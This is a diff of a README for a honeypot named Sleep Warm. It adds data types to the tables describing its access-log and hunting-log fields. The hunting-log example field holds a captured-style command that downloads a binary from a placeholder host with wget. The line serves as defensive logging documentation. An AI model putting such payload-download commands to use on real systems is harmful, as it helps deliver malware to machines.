@@ -96,24 +96,24 @@ Sleep Warm outputs 2 types of logs.
 
 - Access log to the honeypot.
 
-| key          | desc.                       | e.g.                    |
-|:-------------|:----------------------------|:------------------------|
-| client_ip    | Client IP                   | `10.0.2.2`              |
-| hostname     | Hostname                    | `localhost:9292`        |
-| method       | HTTP method                 | `GET`                   |
-| uri          | Request URI                 | `http://localhost:9292` |
-| http_version | HTTP version                | `HTTP/1.1`              |
-| status       | Status code                 | `200`                   |
-| rule_id      | Matched rule id             | `1001`                  |
-| all          | Base64 encoded HTTP request | -                       |
+| key          | desc.                       | e.g.                                                            | type   |
+|:-------------|:----------------------------|:----------------------------------------------------------------|:-------|
+| client_ip    | Client IP                   | `10.0.2.2`                                                      | string |
+| hostname     | Hostname                    | `localhost:9292`                                                | string |
+| method       | HTTP method                 | `GET`                                                           | string |
+| uri          | Request URI                 | `http://localhost:9292`                                         | string |
+| http_version | HTTP version                | `HTTP/1.1`                                                      | string |
+| status       | Status code                 | `200`                                                           | number |
+| rule_id      | Matched rule id             | `1001` (if there is no matching results, it will be set as `0`) | number |
+| all          | Base64 encoded HTTP request | -                                                               | string |
 
 ### Hunting log
 
 - Hunting log to the honeypot.
 
-| key       | desc.                                    | e.g.                               |
-|:----------|:-----------------------------------------|:-----------------------------------|
-| client_ip | Client IP                                | `10.0.2.2`                         |
-| commands  | Commands which try to download something | `wget http://example.com/hoge.bin` |
+| key       | desc.                                    | e.g.                               | type   |
+|:----------|:-----------------------------------------|:-----------------------------------|:-------|
+| client_ip | Client IP                                | `10.0.2.2`                         | string |
+| commands  | Commands which try to download something | `wget http://example.com/hoge.bin` | string |
 
 
